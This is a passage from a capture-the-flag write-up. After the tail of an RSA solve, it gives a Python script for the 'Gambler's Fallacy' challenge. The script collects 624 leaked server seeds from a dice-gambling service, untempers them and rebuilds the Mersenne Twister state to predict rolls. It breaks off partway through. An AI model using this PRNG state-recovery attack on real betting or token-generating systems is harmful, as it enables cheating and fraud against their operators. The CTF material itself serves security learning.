</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=n>d2</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>m</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=gamblers-fallacy--状态solvedlive>Gambler&rsquo;s Fallacy | 状态:solved｜Live</h2><p><strong>题目描述</strong></p><p>can we win a zillion dollars tonight?</p><p>algorithms inspired by primedice</p><p>​<code>nc 34.162.20.138 5000</code>​</p><p><strong>WriteUp</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Untempering functions</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>undo_right_shift_xor</span><span class=p>(</span><span class=n>y</span><span class=p>,</span> <span class=n>shift</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>y</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>shift</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=n>shift</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=n>y</span> <span class=o>^</span> <span class=p>(</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=n>shift</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>undo_left_shift_xor_mask</span><span class=p>(</span><span class=n>y</span><span class=p>,</span> <span class=n>shift</span><span class=p>,</span> <span class=n>mask</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>y</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>shift</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=n>shift</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=n>y</span> <span class=o>^</span> <span class=p>((</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=n>shift</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>untemper</span><span class=p>(</span><span class=n>y</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=n>undo_right_shift_xor</span><span class=p>(</span><span class=n>y</span><span class=p>,</span> <span class=mi>18</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=n>undo_left_shift_xor_mask</span><span class=p>(</span><span class=n>y</span><span class=p>,</span> <span class=mi>15</span><span class=p>,</span> <span class=mh>0xefc60000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=n>undo_left_shift_xor_mask</span><span class=p>(</span><span class=n>y</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mh>0x9d2c5680</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=n>undo_right_shift_xor</span><span class=p>(</span><span class=n>y</span><span class=p>,</span> <span class=mi>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>y</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>calculate_roll</span><span class=p>(</span><span class=n>server_seed</span><span class=p>,</span> <span class=n>client_seed</span><span class=p>,</span> <span class=n>nonce</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>nonce_client_msg</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>client_seed</span><span class=si>}</span><span class=s2>-</span><span class=si>{</span><span class=n>nonce</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>sig</span> <span class=o>=</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>server_seed</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>nonce_client_msg</span><span class=p>,</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>lucky</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sig</span><span class=p>[</span><span class=n>index</span><span class=o>*</span><span class=mi>5</span><span class=p>:</span><span class=n>index</span><span class=o>*</span><span class=mi>5</span><span class=o>+</span><span class=mi>5</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>lucky</span> <span class=o>&gt;=</span> <span class=mf>1e6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>lucky</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sig</span><span class=p>[</span><span class=n>index</span> <span class=o>*</span> <span class=mi>5</span><span class=p>:</span><span class=n>index</span> <span class=o>*</span> <span class=mi>5</span> <span class=o>+</span> <span class=mi>5</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>index</span> <span class=o>*</span> <span class=mi>5</span> <span class=o>+</span> <span class=mi>5</span> <span class=o>&gt;</span> <span class=mi>129</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>lucky</span> <span class=o>=</span> <span class=mi>9999</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>round</span><span class=p>((</span><span class=n>lucky</span> <span class=o>%</span> <span class=mf>1e4</span><span class=p>)</span> <span class=o>*</span> <span class=mf>1e-2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>RemoteConnection</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>read_until</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>delimiter</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=n>delimiter</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=ow>not</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span> <span class=o>+=</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>delimiter</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>pos</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>delimiter</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>delimiter</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span><span class=p>[:</span><span class=n>pos</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span><span class=p>[</span><span class=n>pos</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>result</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>read_line</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span><span class=p>:</span> <span class=c1># Return remaining buffer as line</span>
</span></span><span class=line><span class=cl>                    <span class=n>res</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span>
</span></span><span class=line><span class=cl>                    <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>res</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span> <span class=o>+=</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>pos</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span><span class=p>[:</span><span class=n>pos</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>buffer</span><span class=p>[</span><span class=n>pos</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>result</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>send_line</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>line</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>s</span><span class=o>.</span><span class=n>sendall</span><span class=p>((</span><span class=n>line</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>close</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>HOST</span> <span class=o>=</span> <span class=s2>&#34;34.162.20.138&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>PORT</span> <span class=o>=</span> <span class=mi>5000</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Connecting to </span><span class=si>{</span><span class=n>HOST</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>PORT</span><span class=si>}</span><span class=s2>...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span> <span class=o>=</span> <span class=n>RemoteConnection</span><span class=p>(</span><span class=n>HOST</span><span class=p>,</span> <span class=n>PORT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Initial prompt</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Reading initial banner...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 1: Play 624 games to collect seeds</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Step 1: Playing 624 games to collect seeds...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=s2>&#34;b&#34;</span><span class=p>)</span> <span class=c1># gamble</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;Wager per game (min-wager is&#34;</span><span class=p>)</span> <span class=c1># variable</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span> <span class=c1># wager 1</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;Number of games (int): &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=s2>&#34;624&#34;</span><span class=p>)</span> <span class=c1># 624 games</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;Enter your number higher or equal to the roll between 2-98 (prize improves with lower numbers): &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=s2>&#34;98&#34;</span><span class=p>)</span> <span class=c1># safe bet</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=s2>&#34;Do you wish to proceed? (Y/N)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send_line</span><span class=p>(</span><span class=s2>&#34;Y&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Read output and parse seeds</span>
</span></span><span class=line><span class=cl>    <span class=n>server_seeds</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># We expect 624 lines of game output</span>
</span></span><span class=line><span class=cl>    <span class=n>buffer</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>line</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>read_line</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Print progress every 50 lines</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>server_seeds</span><span class=p>)</span> <span class=o>%</span> <span class=mi>50</span> <span class=o>==</span> <span class=mi>0</span> <span class=ow>and</span> <span class=s2>&#34;Server-Seed&#34;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;Server-Seed:&#34;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;Server-Seed: (\d+)&#34;</span><span class=p>,</span> <span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>server_seeds</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;Final Balance&#34;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>buffer</span> <span class=o>=</span> <span class=n>line</span> <span class=c1># Keep final balance line</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Collected </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>server_seeds</span><span class=p>)</span><span class=si>}</span><span class=s2> seeds.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>server_seeds</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>624</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Error: Did not collect 624 seeds.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 2: Reconstruct PRNG state</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Step 2: Reconstructing PRNG state...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>state_vals</span> <span class=o>=</span> <span class=p>[</span><span class=n>untemper</span><span class=p>(</span><span class=n>y</span><span class=p>)</span> <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=n>server_seeds</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>reconstructed_state</span> <span class=o>=</span> <span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=nb>tuple</span><span class=p>(</span><span class=n>state_vals</span> <span class=o>+</span> <span class=p>[</span><span class=mi>624</span><span class=p>]),</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>Random</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>setstate</span><span class=p>(</span><span class=n>reconstructed_state</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Current nonce is 624</span>
</span></span><span class=line><span class=cl>    <span class=n>nonce</span> <span class=o>=</span> <span class=mi>624</span>
</span></span><span class=line><span class=cl>    <span class=n>client_seed</span> <span class=o>=</span> <span class=s2>&#34;1337awesome&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Check current balance</span>
</span></span><span class=line><span class=cl>    <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;Final Balance: ([\d\.]+)&#34;</span><span class=p>,</span> <span class=n>buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>current_balance</span> <span class=o>=</span> <span class=nb>float</span><span class=p>(</span><span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span> <span class=k>if</span> <span class=k>match</span> <span class=k>else</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Current Balance: </span><span class=si>{</span><span class=n>current_balance</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
